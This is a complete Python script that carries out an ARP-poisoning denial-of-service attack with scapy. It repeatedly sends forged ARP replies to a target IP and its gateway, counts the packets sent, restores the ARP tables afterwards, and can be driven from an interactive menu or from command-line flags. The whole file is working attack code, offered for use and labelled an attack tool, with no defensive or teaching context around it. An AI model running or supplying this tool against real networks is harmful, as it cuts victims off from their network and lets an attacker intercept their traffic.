#!/usr/bin/env python3
# ARP Poison (Denial of Service)

import threading
import time
import os
import signal
import sys
from scapy.all import ARP, send

# Globals
stopAttack = False
packetsSent = 0
errorsCount = 0

def signalHandler(sig, frame):
    global stopAttack
    print("\n[!] Interrupted. Stopping attack.")
    stopAttack = True
    sys.exit(0)

signal.signal(signal.SIGINT, signalHandler)

def arpPoison(targetIp, gatewayIp):
    """Continuously send ARP poison packets."""
    global stopAttack, packetsSent, errorsCount
    while not stopAttack:
        try:
            send(ARP(op=2, pdst=targetIp, psrc=gatewayIp), verbose=0)
            send(ARP(op=2, pdst=gatewayIp, psrc=targetIp), verbose=0)
            packetsSent += 2
            time.sleep(0.01)
        except Exception:
            errorsCount += 1
            time.sleep(1)

def restoreNetwork(targetIp, gatewayIp):
    """Restore correct ARP entries once attack stops."""
    send(ARP(op=2, pdst=gatewayIp, psrc=targetIp, hwdst="ff:ff:ff:ff:ff:ff"), count=3, verbose=0)
    send(ARP(op=2, pdst=targetIp, psrc=gatewayIp, hwdst="ff:ff:ff:ff:ff:ff"), count=3, verbose=0)

def startAttack(targetIp, gatewayIp, duration):
    """Start the ARP poison attack for the given duration."""
    global stopAttack, packetsSent, errorsCount
    if os.geteuid() != 0:
        print("[!] This script requires root privileges.")
        return

    stopAttack = False
    packetsSent = 0
    errorsCount = 0
    startTime = time.time()

    print(f"\n[*] ARP poison started: target={targetIp}, gateway={gatewayIp}, duration={duration}s")

    thread = threading.Thread(target=arpPoison, args=(targetIp, gatewayIp), daemon=True)
    thread.start()

    try:
        while not stopAttack and (time.time() - startTime) < duration:
            elapsed = time.time() - startTime
            print(
                f"\rPackets Sent: {packetsSent} | "
                f"Errors: {errorsCount} | "
                f"Duration: {int(elapsed)}s",
                end="", flush=True
            )
            time.sleep(1)
    except KeyboardInterrupt:
        stopAttack = True

    stopAttack = True
    thread.join()
    restoreNetwork(targetIp, gatewayIp)

    totalDuration = time.time() - startTime
    print(
        f"\n\n[*] Attack complete: Packets Sent={packetsSent}, "
        f"Errors={errorsCount}, Duration={int(totalDuration)}s"
    )

def menu():
    targetIp  = input("Enter target IP: ").strip()
    gatewayIp = input("Enter gateway IP: ").strip()
    try:
        duration = int(input("Enter duration in seconds [30]: ").strip() or "30")
    except ValueError:
        duration = 30
    startAttack(targetIp, gatewayIp, duration)

def terminal():
    import argparse
    parser = argparse.ArgumentParser(description="ARP Poison Attack Tool")
    parser.add_argument("-t", "--target",   required=True, help="Target IP")
    parser.add_argument("-g", "--gateway",  required=True, help="Gateway IP")
    parser.add_argument("-d", "--duration", type=int, default=30, help="Duration in seconds")
    args = parser.parse_args()
    startAttack(args.target, args.gateway, args.duration)

def main():
    if len(sys.argv) > 1:
        terminal()
    else:
        menu()

if __name__ == "__main__":
    main()  
